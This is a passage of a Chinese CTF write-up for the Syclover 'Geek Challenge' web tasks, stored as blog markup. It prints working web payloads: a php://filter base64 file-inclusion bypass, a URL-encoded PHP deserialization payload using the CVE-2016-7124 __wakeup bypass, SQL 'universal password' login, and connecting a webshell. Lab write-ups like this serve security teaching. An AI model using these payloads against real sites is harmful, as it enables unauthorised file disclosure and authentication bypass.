class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">style</span>=<span class=\"string\">\"font-family:verdana;color:red;text-align:center;\"</span>&gt;</span>你想知道蒋璐源的秘密么？<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">style</span>=<span class=\"string\">\"font-family:arial;color:red;font-size:20px;text-align:center;\"</span>&gt;</span>想要的话可以给你，去找吧！把一切都放在那里了！<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">id</span>=<span class=\"string\">\"master\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"./Archive_room.php\"</span> <span class=\"attr\">style</span>=<span class=\"string\">\"background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;\"</span>&gt;</span>Oh! You found me<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"position: absolute;bottom: 0;width: 99%;\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">align</span>=<span class=\"string\">\"center\"</span> <span class=\"attr\">style</span>=<span class=\"string\">\"font:italic 15px Georgia,serif;color:white;\"</span>&gt;</span> Syclover @ cl4y<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>点击其中的链接</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">style</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/css\"</span> &gt;</span></span><br><span class=\"line\"><span class=\"css\"><span class=\"selector-id\">#master</span>\t&#123;</span></span><br><span class=\"line\"><span class=\"css\">    <span class=\"selector-tag\">position</span><span class=\"selector-pseudo\">:absolute</span>;</span></span><br><span class=\"line\"><span class=\"css\">    <span class=\"selector-tag\">left</span><span class=\"selector-pseudo\">:44</span>%;</span></span><br><span class=\"line\"><span class=\"css\">    <span class=\"selector-tag\">bottom</span><span class=\"selector-pseudo\">:20</span>;</span></span><br><span class=\"line\"><span class=\"css\">    <span class=\"selector-tag\">text-align</span> <span class=\"selector-pseudo\">:center</span>;</span></span><br><span class=\"line\">    \t&#125;</span><br><span class=\"line\">        p,h1 &#123;</span><br><span class=\"line\">                cursor: default;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"utf-8\"</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>绝密档案<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span> <span class=\"attr\">style</span>=<span class=\"string\">\"background-color:black;\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">style</span>=<span class=\"string\">\"font-family:verdana;color:red;text-align:center;\"</span>&gt;</span></span><br><span class=\"line\">\t\t我把他们都放在这里了，去看看吧\t\t<span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">id</span>=<span class=\"string\">\"master\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"./action.php\"</span> <span class=\"attr\">style</span>=<span class=\"string\">\"background-color:red;height:50px;width:200px;color:#FFFFFF;left:44%;\"</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">font</span> <span class=\"attr\">size</span>=<span class=\"string\">6</span>&gt;</span>SECRET<span class=\"tag\">&lt;/<span class=\"name\">font</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"position: absolute;bottom: 0;width: 99%;\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">align</span>=<span class=\"string\">\"center\"</span> <span class=\"attr\">style</span>=<span class=\"string\">\"font:italic 15px Georgia,serif;color:white;\"</span>&gt;</span> Syclover @ cl4y<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>再次点击链接</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">        p,h1 &#123;</span><br><span class=\"line\">                cursor: default;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"utf-8\"</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>END<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span> <span class=\"attr\">style</span>=<span class=\"string\">\"background-color:black;\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">style</span>=<span class=\"string\">\"font-family:verdana;color:red;text-align:center;\"</span>&gt;</span>查阅结束<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">style</span>=<span class=\"string\">\"font-family:arial;color:red;font-size:20px;text-align:center;\"</span>&gt;</span>没看清么？回去再仔细看看吧。<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">\"position: absolute;bottom: 0;width: 99%;\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">align</span>=<span class=\"string\">\"center\"</span> <span class=\"attr\">style</span>=<span class=\"string\">\"font:italic 15px Georgia,serif;color:white;\"</span>&gt;</span> Syclover @ cl4y<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>和之前南邮cft的一道web有点像</p>\n<p>直接上burp suite</p>\n<p>一直点，查看记录，发现有一个</p>\n<p><img src=\"/pic/12.png\" alt=\"\"></p>\n<p>打开发现源码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">    &lt;title&gt;secret&lt;&#x2F;title&gt;</span><br><span class=\"line\">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">    error_reporting(0);</span><br><span class=\"line\">    $file&#x3D;$_GET[&#39;file&#39;];</span><br><span class=\"line\">    if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class=\"line\">        echo &quot;Oh no!&quot;;</span><br><span class=\"line\">        exit();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    include($file); </span><br><span class=\"line\">&#x2F;&#x2F;flag放在了flag.php里</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>\n\n<p><code>payload：?file=php://filter/read=convert.base64-encode/resource=./flag.php</code></p>\n<p>将得到的base64解码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;head&gt;</span><br><span class=\"line\">        &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class=\"line\">        &lt;title&gt;FLAG&lt;&#x2F;title&gt;</span><br><span class=\"line\">    &lt;&#x2F;head&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;body style&#x3D;&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class=\"line\">        </span><br><span class=\"line\">        &lt;h1 style&#x3D;&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;ååï¼ä½ æ¾å°æäºï¼å¯æ¯ä½ çä¸å°æQAQ~~~&lt;&#x2F;h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class=\"line\">        </span><br><span class=\"line\">        &lt;p style&#x3D;&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;</span><br><span class=\"line\">            &lt;?php</span><br><span class=\"line\">                echo &quot;æå°±å¨è¿é&quot;;</span><br><span class=\"line\">                $flag &#x3D; &#39;flag&#123;d144e819-346a-49ab-98e7-2fea0b2b9f6d&#125;&#39;;</span><br><span class=\"line\">                $secret &#x3D; &#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#39;</span><br><span class=\"line\">            ?&gt;</span><br><span class=\"line\">        &lt;&#x2F;p&gt;</span><br><span class=\"line\">    &lt;&#x2F;body&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;&#x2F;htmlPgo</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"PHP\"><a href=\"#PHP\" class=\"headerlink\" title=\"PHP\"></a>PHP</h3><p>常规扫描手工or御剑，发现<code>www.zip</code>存在源码</p>\n<p>class.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">'flag.php'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Name</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $username = <span class=\"string\">'nonono'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $password = <span class=\"string\">'yesyes'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($username,$password)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;username = $username;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;password = $password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;username = <span class=\"string\">'guest'</span>;    <span class=\"comment\">//此处需要绕过</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;password != <span class=\"number\">100</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"You name is: \"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;username;<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;/br&gt;\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"You password is: \"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;password;<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;/br&gt;\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;username === <span class=\"string\">'admin'</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">global</span> $flag;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> $flag;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">            </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$a=<span class=\"keyword\">new</span> Name(<span class=\"string\">'admin'</span>,<span class=\"number\">100</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">var_dump(serialize($a));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>index.php中关键代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">   <span class=\"keyword\">include</span> <span class=\"string\">'class.php'</span>;</span><br><span class=\"line\">   $select = $_GET[<span class=\"string\">'select'</span>];</span><br><span class=\"line\">   $res=unserialize(@$select);</span><br><span class=\"line\">   <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>flag.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$flag = <span class=\"string\">'Syc&#123;dog_dog_dog_dog&#125;'</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>分析后这是一个序列化+绕过<code>__wakeup()</code>  </p>\n<p><code>unserialize()</code> 会检查是否存在一个 <code>__wakeup()</code> 方法。如果存在，则会先调用 <code>__wakeup</code> 方法，预先准备对象需要的资源。</p>\n<p><code>serialize()</code> 会检查是否存在一个 <code>__sleep()</code> 方法。如果存在，则会先调用 <code>__sleep()</code> 。</p>\n<p><code>CVE-2016-7124</code>提到<code>unserialize()</code> 绕过<code>__wakeup()</code>的方法，在序列化后对象数量声明中大于原本的的数量即可绕过。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Name</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $username = <span class=\"string\">'admin'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $password = <span class=\"number\">100</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a=<span class=\"keyword\">new</span> Name();</span><br><span class=\"line\">var_dump(urlencode(serialize($a))); <span class=\"comment\">//O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D</span></span><br><span class=\"line\">var_dump(serialize($a));<span class=\"comment\">//O:4:\"Name\":2:&#123;s:14:\"�Name�username\";s:5:\"admin\";s:14:\"�Name�password\";i:100;&#125;   </span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>因为有不可打印字符，所以选择经过URL编码后的</p>\n<p><code>payload：O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D</code></p>\n<p><img src=\"/pic/13.png\" alt=\"\"></p>\n","site":{"data":{}},"excerpt":"<h1 id=\"极客大挑战web\"><a href=\"#极客大挑战web\" class=\"headerlink\" title=\"极客大挑战web\"></a>极客大挑战web</h1><h3 id=\"Havefun\"><a href=\"#Havefun\" class=\"headerlink\" title=\"Havefun\"></a>Havefun</h3><p>查看源码,发现提示</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">        <span class=\"comment\">&lt;!--</span></span><br><span class=\"line\"><span class=\"comment\">$cat=$_GET['cat'];</span></span><br><span class=\"line\"><span class=\"comment\">echo $cat;</span></span><br><span class=\"line\"><span class=\"comment\">if($cat=='dog')&#123;</span></span><br><span class=\"line\"><span class=\"comment\">    echo 'Syc&#123;cat_cat_cat_cat&#125;';</span></span><br><span class=\"line\"><span class=\"comment\">&#125;</span></span><br><span class=\"line\"><span class=\"comment\">--&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>payload=<code>?cat=dog</code></p>","more":"<p><img src=\"/pic/9.png\" alt=\"\"></p>\n<h3 id=\"EasySQL\"><a href=\"#EasySQL\" class=\"headerlink\" title=\"EasySQL\"></a>EasySQL</h3><p>万能密码直接获取结果</p>\n<p><img src=\"/pic/10.png\" alt=\"\"></p>\n<h3 id=\"Knife\"><a href=\"#Knife\" class=\"headerlink\" title=\"Knife\"></a>Knife</h3><p>使用菜刀或者蚁剑连接 密码Syc</p>\n<p><img src=\"/pic/11.png\" alt=\"\"></p>\n<p>flag在根目录下</p>\n<h3 id=\"Secret-File\"><a href=\"#Secret-File\" class=\"headerlink\" title=\"Secret File\"></a>Secret File</h3><p>查看源码</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">style</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/css\"</span> &gt;</span></span><br><span class=\"line\"><span class=\"css\"><span class=\"selector-id\">#master</span> &#123;</span></span><br><span class=\"line\"><span class=\"css\">    <span class=\"selector-tag\">position</span><span class=\"selector-pseudo\">:absolute</span>;</span></span><br><span class=\"line\"><span class=\"css\">    <span class=\"selector-tag\">left</span><span class=\"selector-pseudo\">:44</span>%;</span></span><br><span class=\"line\"><span class=\"css\">    <span class=\"selector-tag\">bottom</span><span class=\"selector-pseudo\">:0</span>;</span></span><br><span class=\"line\"><span class=\"css\">    <span class=\"selector-tag\">text-align</span> <span class=\"selector-pseudo\">:center</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        p,h1 &#123;</span><br><span class=\"line\">                cursor: default;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"utf-8\"</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>蒋璐源的秘密<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span 